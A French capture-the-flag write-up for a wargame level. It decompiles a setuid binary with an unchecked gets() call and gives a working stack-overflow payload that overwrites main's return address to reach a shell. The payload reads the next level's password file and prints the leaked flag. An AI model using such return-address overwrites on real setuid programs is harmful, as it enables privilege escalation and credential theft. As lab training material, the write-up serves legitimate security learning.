# Level1

De la meme maniere que l'exercise precedent nous avont aussi un binaire nomme level1:

```bash
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Apres avoir decompile le programme:

```C
#include <stdio.h>
#include <stdlib.h>

void run(void)
{
    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
    system("/bin/bash");
    return ;
}

void main(void)
{
    char buff[76];

    gets(buff);
    return ;
}
```

`gets()` n'etant pas protege nous pouvons reecrire l'adresse de retour de `main()`. Par defaut apres `gets()` on return du `main()` et donc on exit le programme. On a juste a ecraser l'adresse de retour du `main()` par celle de `run()`. En decompilant le programme on obtient cette adresse de debut: `08048444`

Etant donne que nous sommes sur une architecture x86 l'addresse est interpretee de cette maniere par le CPU:

```
\44 \84 \04 \08
```

Ensuite en utilisant python et cat nous pouvons ecraser l'adresse de retour et executer une commande:

```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"' ; echo 'cat /home/user/level2/.pass' ) | ./level1 
Good... Wait what?
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)
```
